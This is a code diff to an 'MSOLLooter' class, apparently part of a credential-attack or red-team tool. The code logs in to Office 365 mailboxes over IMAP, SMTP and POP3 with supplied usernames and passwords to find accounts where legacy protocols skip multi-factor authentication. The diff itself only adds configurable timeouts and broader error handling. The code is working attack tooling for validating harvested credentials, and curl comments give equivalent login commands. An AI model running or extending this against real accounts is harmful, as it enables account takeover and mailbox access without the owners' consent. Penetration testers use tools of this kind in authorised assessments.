@@ -1,5 +1,6 @@
 import re
 import logging
+import socket
 from ..util import *
 from .base import Looter
 from contextlib import suppress
@@ -29,13 +30,13 @@ class MSOLLooter(Looter):
 
         # curl -v "imaps://outlook.office365.com:993/INBOX" --user "username:password"
         try:
-            session = IMAP4_SSL("outlook.office365.com", 993)
+            session = IMAP4_SSL("outlook.office365.com", 993, timeout=self.timeout)
             log.debug(session.welcome.decode())
             session.login(username, password)
             log.success(f"MFA bypass (IMAP) enabled for {username}!")
             success = True
 
-        except IMAP4.error as e:
+        except (IMAP4.error, socket.timeout, OSError) as e:
             log.warning(f"IMAP MFA bypass failed for {username}: {e}")
 
         except Exception as e:
@@ -59,14 +60,14 @@ class MSOLLooter(Looter):
         hosts = ["outlook.office365.com:587", "smtp.office365.com:587"]
         for host in hosts:
             try:
-                session = smtplib.SMTP(host, timeout=5)
+                session = smtplib.SMTP(host, timeout=self.timeout)
                 log.debug(session.starttls())
                 session.login(username, password)
                 log.success(f"MFA bypass (SMTP) enabled for {username}!")
                 success = True
                 break
 
-            except smtplib.SMTPException as e:
+            except (smtplib.SMTPException, socket.timeout, OSError) as e:
                 log.warning(f"SMTP MFA bypass failed for {username}: {e}")
 
             except Exception as e:
@@ -87,14 +88,14 @@ class MSOLLooter(Looter):
 
         # curl -v "pop3s://outlook.office365.com:995/INBOX" --user "user:password"
         try:
-            session = poplib.POP3_SSL("outlook.office365.com")
+            session = poplib.POP3_SSL("outlook.office365.com", timeout=self.timeout)
             log.debug(session.getwelcome())
             session.user(username)
             session.pass_(password)
             log.success(f"MFA bypass (POP3) enabled for {username}!")
             success = True
 
-        except poplib.error_proto as e:
+        except (poplib.error_proto, socket.timeout, OSError) as e:
             log.warning(f"POP3 MFA bypass failed for {username}: {e}")
 
         except Exception as e:
